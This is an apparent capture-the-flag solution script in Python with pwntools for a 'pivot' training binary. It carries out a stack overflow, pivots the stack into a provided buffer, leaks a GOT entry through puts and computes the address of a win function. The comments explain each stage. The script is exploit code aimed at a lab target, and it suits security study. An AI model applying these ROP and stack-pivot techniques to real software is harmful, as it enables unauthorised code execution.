#!/usr/bin/env python3
from pwn import *
import binascii

"""
This one is a lot easier than the last one. 

The basic idea is this -- we can only over run the stack with a few gadgets,
but we are given a giant buffer that we an add more of our ROP gadgets to, and 
we are provided the address of that buffer in the initial output. 

There are probably awesome ways to do this problem but I took the most direct route 
as follows:

    STAGE #1
    1. Record the pointer given to us.

    2. Run through main, hitting the foothold function. This will establish it's 
    address in libpivot.so inside the got.plt.
    
    3. After the foothold function has been run, put the address of it's got.plt entry
    into RDI and leak it by jumping to puts.
    
    NOTE: If there was a null byte in the pointer, this might foil our plan.
    
    4. Jump back to main to start all over again.

    STAGE #2
    
    5. Calculate the address of the pwnme function. As we know the offset between
    foothold_func and pwnme, we can easily identify the address of pwnme.

    6. Load that address onto the stack, and ROP right into it.

"""


context.terminal = ["tmux", "splitw", "-h"]

# Foothold function PLT address.
foothold_func = p64(0x00400720)

# Foothold function .got.plt address
# We will leak this value, then use it to calculate
# the address of the pwnme function.
foothold_got = p64(0x00601040)

# Puts plt function. We'll use this to leak or pointer to
# foothold_funcion.
puts_func = p64(0x004006e0)

# The address of main. We'll need this to send in more data for stage 2
main_address = p64(0x00400847)

# A few provided gadgets.
# Pop rax is needed for the xchg function.
pop_rax = p64(0x004009bb)
xchg = p64(0x004009bd)

# Generally useful gadget
pop_rdi = p64(0x00400a33)

gen = cyclic_gen()
data = gen.get(40)

# This is the offset between ret2win and the foothold function.
ret2win_offset = 0x117

p = process("./pivot")

# Get the pointer to the large buffer we can write to.
p.readuntilS("pivot: ")
big_buffer = p.readlineS().strip()
print(f"We can place our larger ropchain inside of: '{big_buffer}'")
big_buffer = p64(int(big_buffer, 16))

"""
Stage 1. in this stage, we'll run through the PLT, and populate the GOT 
so we can calculate the address of our pwn2win function.
"""
# Filler
small_data = data
# Put our pointer into RAX
small_data += pop_rax
small_data += big_buffer
# Make our pointer the new stack pointer the chain will continue from there
small_data += xchg

# Run through the foothold function to establish its address
# in libpivot.so
big_data = b""
big_data += foothold_func
# Leak out the address of foothold function
big_data += pop_rdi
big_data += foothold_got
# Print out the address of the foothold function
big_data += puts_func
big_data += main_address # Go back to main 

# Send in Stage 1
print(p.readuntil(b"> "))
p.sendline(big_data)

print(p.readuntil(b"> "))
p.sendline(small_data)

p.readuntilS("libpivot\n")
# Get our leaked address from puts
pivot_addr = p.readline().strip()
foothold_address = int.from_bytes(pivot_addr, 'little', signed=False)
# This calculates our address to ret2win.
ret2win_address = foothold_address + ret2win_offset
print(f"Pivot Addr: {hex(int.from_bytes(pivot_addr, 'little', signed=False))}")
print(f"Ret2win address: {hex(ret2win_address)}")

"""
Stage 2

We now have the address of ret2win, so all we need to do is drop into it. It doesn't require any 
parameters, so we just gotta drop in.
"""
small_data = data
small_data += p64(ret2win_address)

p.sendline(small_data)
p.sendline(small_data)

p.interactive()
